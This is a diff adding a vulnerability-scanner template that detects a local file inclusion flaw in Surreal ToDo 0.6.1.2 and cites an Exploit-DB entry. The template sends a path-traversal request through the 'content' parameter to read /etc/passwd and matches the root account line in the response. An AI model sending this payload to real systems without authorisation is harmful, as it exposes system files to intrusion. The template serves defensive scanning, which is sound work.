@@ -1,0 +1,29 @@
+id: "surrealtodo-lfi"
+name: "Surreal ToDo 0.6.1.2 - Local File Inclusion"
+severity: "high"
+description: "Surreal ToDo 0.6.1.2 is vulnerable to local file inclusion via index.php and the content parameter."
+tech:
+  - "php"
+tags:
+  - "surreal"
+  - "lfi"
+  - "edb"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.exploit-db.com/exploits/45826"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php?content=../../../../../../../../etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:[x*]:0:0"
+  - type: "status"
+    status:
+      - 200
